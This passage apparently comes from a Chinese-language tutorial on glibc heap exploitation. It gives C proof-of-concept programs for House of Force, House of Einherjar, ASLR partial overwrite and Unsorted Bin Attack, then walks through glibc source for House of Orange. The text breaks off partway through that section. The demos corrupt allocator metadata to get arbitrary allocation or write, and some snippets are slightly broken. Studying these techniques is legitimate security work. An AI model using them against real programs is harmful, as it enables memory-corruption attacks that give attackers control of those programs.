  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>               <span class="c1">// padding</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">top_chunk</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">requestSize</span><span class="p">,</span> <span class="n">allotedSize</span><span class="p">;</span>

  <span class="c1">//void *victim = main;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>

  <span class="c1">// First, request a chunk, so that we can get a pointer to top chunk</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span>
  <span class="n">chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">chunk</span><span class="p">);</span>

  <span class="c1">// lower three bits of chunk-&gt;size are flags</span>
  <span class="n">allotedSize</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x1</span> <span class="o">|</span> <span class="mh">0x2</span> <span class="o">|</span> <span class="mh">0x4</span><span class="p">);</span>

  <span class="c1">// top chunk will be just next to &#39;ptr&#39;</span>
  <span class="n">top_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk</span> <span class="o">+</span> <span class="n">allotedSize</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">top_chunk</span><span class="p">);</span>

  <span class="c1">// here, attacker will overflow the &#39;size&#39; parameter of top chunk</span>
  <span class="n">top_chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>       <span class="c1">// Maximum size</span>

  <span class="c1">// Might result in an integer overflow, doesn&#39;t matter</span>
  <span class="n">requestSize</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">victim</span>            <span class="c1">// The target address that malloc should return</span>
                  <span class="o">-</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">top_chunk</span>     <span class="c1">// The present address of the top chunk</span>
                  <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span>   <span class="c1">// Size of `size` and `prev_size`</span>
                  <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">);</span>    <span class="c1">// Additional buffer</span>

  <span class="c1">// This also needs to be forced by the attacker</span>
  <span class="c1">// This will advance the top_chunk ahead by (requestSize+header+additional buffer)</span>
  <span class="c1">// Making it point to `victim`</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="n">requestSize</span><span class="p">));</span>

  <span class="c1">// The top chunk again will service the request and return `victim`</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>上述代码中，假设想申请的地址在top chunk后面，那么示意图如下</p>
<div class="highlight"><pre><span></span>|               | 8 | 8 | 8 |           |       |   |
|   last chunk  |       top chunk       | ..... | P |
|               |                       |       |   |
                            |--- requestSize ---|
</pre></div>

<p>这里主要requestSize中多减了一个8，那是因为chunk大小计算的时候需要加8再向上对齐。</p>
<h2 id="7-house-of-einherjar-rewrite-prev_size-and-p">7. House of Einherjar / rewrite prev_size and <code>P</code></h2>
<p>这种攻击通过溢出来修改下一个chunk的<code>P</code>位，并且修改下一个chunk的prev_size，使得合并的时候能够过多的合并，通过精确计算prev_size，使得下一次malloc的时候申请到假的chunk</p>
<ul>
<li>条件<ul>
<li>溢出覆盖<code>P</code></li>
<li>能够伪造虚假chunk</li>
</ul>
</li>
<li>安全检查<ul>
<li>假的chunk P需要满足<code>P-&gt;fd-&gt;bk == P and P-&gt;bk-&gt;fd == P</code></li>
<li>假的chunk P后面的chunk需要满足<code>chunksize(P) == prev_size (next_chunk(P)), 0)</code></li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0xe0</span><span class="p">];</span>               <span class="c1">// padding</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span> <span class="n">fake_chunk</span><span class="p">,</span> <span class="n">fake_chunk2</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">allotedSize</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr2</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunk2</span><span class="p">);</span>

  <span class="c1">// Allocate any chunk</span>
  <span class="n">ptr1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptr1</span><span class="p">);</span>

  <span class="c1">// Allocate another chunk</span>
  <span class="n">ptr2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptr2</span><span class="p">);</span>

  <span class="n">chunk1</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">allotedSize</span> <span class="o">=</span> <span class="n">chunk1</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x1</span> <span class="o">|</span> <span class="mh">0x2</span> <span class="o">|</span> <span class="mh">0x4</span><span class="p">);</span>
  <span class="n">allotedSize</span> <span class="o">-=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">);</span>      <span class="c1">// Heap meta data for &#39;prev_size&#39; of chunk1</span>

  <span class="c1">// Attacker initiates a heap overflow</span>
  <span class="c1">// Off by one overflow of ptr1, overflows into ptr2&#39;s &#39;size&#39;</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr1</span><span class="p">;</span>
  <span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">// Zeroes out the PREV_IN_USE bit</span>

  <span class="c1">// Fake chunk</span>
  <span class="n">fake_chunk</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>    <span class="c1">// enough size to service the malloc request</span>
  <span class="c1">// These two will ensure that unlink security checks pass</span>
  <span class="c1">// i.e. P-&gt;fd-&gt;bk == P and P-&gt;bk-&gt;fd == P</span>
  <span class="n">fake_chunk</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>
  <span class="n">fake_chunk</span><span class="p">.</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>

  <span class="c1">// This is needed to pass ‘chunksize(P) == prev_size (next_chunk(P)), 0)’</span>
  <span class="n">fake_chunk2</span><span class="p">.</span><span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>

  <span class="c1">// Overwrite ptr2&#39;s prev_size so that ptr2&#39;s chunk - prev_size points to our fake chunk</span>
  <span class="c1">// This falls within the bounds of ptr1&#39;s chunk - no need to overflow</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span><span class="o">-</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)]</span> <span class="o">=</span>
                                  <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)]</span>  <span class="c1">// ptr2&#39;s chunk</span>
                                  <span class="o">-</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>

  <span class="c1">// Free the second chunk. It will detect the previous chunk in memory as free and try</span>
  <span class="c1">// to merge with it. Now, top chunk will point to fake_chunk</span>
  <span class="n">free</span><span class="p">(</span><span class="n">ptr2</span><span class="p">);</span>

  <span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>这里有两个安全检查，第一个是unlink的常见链表指针检查，另一个是新添加的对后一个chunk的prev_size的检查，这里并不检查后一个chunk的<code>P</code>位，默认unlink的对象是已经unused。</p>
<p>合并的chunk的大小并不是两个偏移的距离，而是假chunk和原chunk的大小的和，因此这里的假chunk大小需要合理设置来满足新malloc的要求。</p>
<h2 id="8-aslr-aslr">8. ASLR绕过 / ASLR低位覆盖</h2>
<p>ASLR可以低位覆盖，x64上地址都是使用小尾数，因此可以覆盖一个字节就可以覆盖低位地址，从而使得部分地址一致</p>
<p>例题（Maybe not runnable）</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">role</span><span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">func</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">name_lenth</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">print</span><span class="p">(</span><span class="n">role</span> <span class="o">*</span><span class="n">p_role</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// on stack</span>
    <span class="n">role</span><span class="o">*</span> <span class="n">p_role</span><span class="p">;</span> <span class="c1">// on stack</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">p_role</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">role</span><span class="p">));</span>
        <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">print</span><span class="p">;</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">name_lenth</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">p_role</span><span class="o">-&gt;</span><span class="n">name_length</span><span class="p">);</span>
        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">p_role</span><span class="o">-&gt;</span><span class="n">n</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
        <span class="n">print</span><span class="p">(</span><span class="n">p_role</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>上述代码中，有很明显的栈溢出，可以使用低位覆盖，来泄露出堆地址。因为代码并不会存储之前循环申请的地址，因此需通过合理的堆布局，使得name指向的地址能够是新一轮的p_role申请的地址，进而再次覆盖成原p_role然后打印出来。</p>
<h2 id="9-unsorted-bin-attack">9. Unsorted Bin Attack</h2>
<p>堆在分配的时候，如果在申请的内存大小所对应的small bin或者large bin里面没有找到对应的chunk，此时会从unsorted bin里面去寻找chunk看是否存在合适的内存分配给用户，这个过程中会把unsorted bin链表给清空，清空的过程中没有进行检查，由此可能会发生任意地址可写。源代码如下：</p>
<div class="highlight"><pre><span></span><span class="k">while</span><span class="p">(</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">))</span>
<span class="c1">//...</span>
<span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
<span class="cm">/* remove from unsorted list */</span>
<span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
<span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
</pre></div>

<p>试想如果bck的fd可以被我们控制，这个时候我们就可以让它指向任意地址，最终使<code>(bck-&gt;fd)+0x10</code>的值被修改成unsorted_chunks(av)，从而实现任意地址写，后续如果能够控制它指向到我们可控的内存区域，最终就有可能会控制整个程序。注意这里<code>unsorted_chunks (av)-&gt;bk</code>被改成了错误地址，有可能使得下一次<code>malloc</code>发生异常。</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This file demonstrates unsorted bin attack by write a large unsigned &quot;</span>
         <span class="s">&quot;long value into stackn&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span>
      <span class="s">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span>
      <span class="s">&quot;attacks, such as rewriting the &quot;</span>
      <span class="s">&quot;global variable global_max_fast in libc for further fastbin attacknn&quot;</span><span class="p">);</span>

  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_var</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Let&#39;s first look at the target we want to rewrite on stack:n&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p: %ldnn&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">,</span> <span class="n">stack_var</span><span class="p">);</span>

  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;And allocate another normal chunk in order to avoid consolidating &quot;</span>
         <span class="s">&quot;the top chunk with&quot;</span>
         <span class="s">&quot;the first one during the free()nn&quot;</span><span class="p">);</span>
  <span class="n">malloc</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>

  <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;We free the first chunk now and it will be inserted in the unsorted &quot;</span>
         <span class="s">&quot;bin with its bk pointer &quot;</span>
         <span class="s">&quot;point to %pn&quot;</span><span class="p">,</span>
         <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="c1">//------------VULNERABILITY-----------</span>

  <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">stack_var</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk &quot;</span>
         <span class="s">&quot;pointern&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;And we write it with the target address-16 (in 32-bits machine, it &quot;</span>
         <span class="s">&quot;should be target address-8):%pnn&quot;</span><span class="p">,</span>
         <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="c1">//------------------------------------</span>

  <span class="n">malloc</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Let&#39;s malloc again to get the chunk we just free. During this time, &quot;</span>
         <span class="s">&quot;target should has already been &quot;</span>
         <span class="s">&quot;rewrite:n&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p: %pn&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">stack_var</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>

<h2 id="10house-of-orange-top-chunk">10.House of orange / 减少Top chunk大小</h2>
<p>在一个没有free的程序里，如果我们想生成unsorted chunk并且使用<code>Unsorted Bin Attack</code>时，可以通过溢出减少top chunk的大小，然后通过分配一个大一点的chunk（不超过mmap.threhold），使得libc使用sbrk系统调用增加arena的下限，生成新的top chunk，并且把原来的变小的topchunk放到unsorted bin里，这样就可以使用<code>Unsorted Bin Attack</code>了。</p>
<p>在HITCON CTF Qual 2016的一道题目House of orange中（<a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500" target="_blank">下载地址</a>），使用了上述的方法展开了<code>Unsorted Bin Attack</code>，并且复写了libc的错误处理流程中的函数，使之执行<code>system</code>。</p>
<p>具体根据源码来看一下，以下分析基于glibc2.23</p>
<p>首先看一下glibc的错误处理函数<code>malloc_printerr</code>，在出现重大错误时，比如<code>unsorted bin attack</code>，会调用<code>abort</code>函数退出程序：</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span>
<span class="nf">malloc_printerr</span> <span class="p">(</span><span class="kt">int</span> <span class="n">action</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">//...</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">abort</span> <span class="p">();</span>
<span class="p">}</span>
</pre></div>

<p>再具体看一下<code>abort</code>函数，内部会调用<code>fflush</code>函数，</p>
<div class="highlight"><pre><span></span><span class="kt">void</span>
<span class="nf">abort</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">act</span><span class="p">;</span>
  <span class="kt">sigset_t</span> <span class="n">sigs</span><span class="p">;</span>

  <span class="cm">/* First acquire the lock.  */</span>
  <span class="n">__libc_lock_lock_recursive</span> <span class="p">(</span><span class="n">lock</span><span class="p">);</span>

  <span class="cm">/* Now it&#39;s for sure we are alone.  But recursive calls are possible.  */</span>

  <span class="cm">/* Unlock SIGABRT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__sigemptyset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">sigs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
      <span class="n">__sigaddset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">sigs</span><span class="p">,</span> <span class="n">SIGABRT</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">__sigprocmask</span> <span class="p">(</span><span class="n">SIG_UNBLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sigs</span><span class="p">,</span> <span class="p">(</span><span class="kt">sigset_t</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* Flush all streams.  We cannot close them now because the user</span>
<span class="cm">     might have registered a handler for SIGABRT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">stage</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="o">++</span><span class="n">stage</span><span class="p">;</span>
      <span class="n">fflush</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="c1">//...</span>
<span class="p">}</span>
</pre></div>

<p>而<code>fflush</code>定义位于<code>abort</code>函数的上方</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;libio/libioP.h&gt;</span><span class="cp"></span>
<span class="cp">#define fflush(s) _IO_flush_all_lockp (0)</span>
</pre></div>

<p>跟进一下<code>_IO_flush_all_lockp</code>函数，可以看到调用了<code>_IO_OVERFLOW</code>函数</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span><span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">last_stamp</span><span class="p">;</span>

  <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">run_fp</span> <span class="o">=</span> <span class="n">fp</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
      <span class="n">_IO_flockfile</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
        <span class="n">_IO_OVERFLOW</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">do_lock</span><span class="p">)</span>
      <span class="n">_IO_funlockfile</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="n">run_fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">last_stamp</span> <span class="o">!=</span> <span class="n">_IO_list_all_stamp</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Something was added to the list.  Start all over again.  */</span>
      <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_IO_list_all</span><span class="p">;</span>
      <span class="n">last_stamp</span> <span class="o">=</span> <span class="n">_IO_list_all_stamp</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
      <span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>而<code>_IO_OVERFLOW</code>是一系列宏定义的组合</p>
<div class="highlight"><pre><span></span><span class="cm">/* Type of MEMBER in struct type TYPE.  */</span>
<span class="cp">#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)</span>
<span class="cm">/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing</span>
<span class="cm">   violation in case THIS has a different pointer type.  */</span>
<span class="cp">#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span>
<span class="cp">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span>
<span class="cp">                       + offsetof(TYPE, MEMBER)))</span>
<span class="cp">#define _IO_JUMPS_FILE_plus(THIS) \</span>
<span class="cp">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span>
<span class="cp">#define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span>
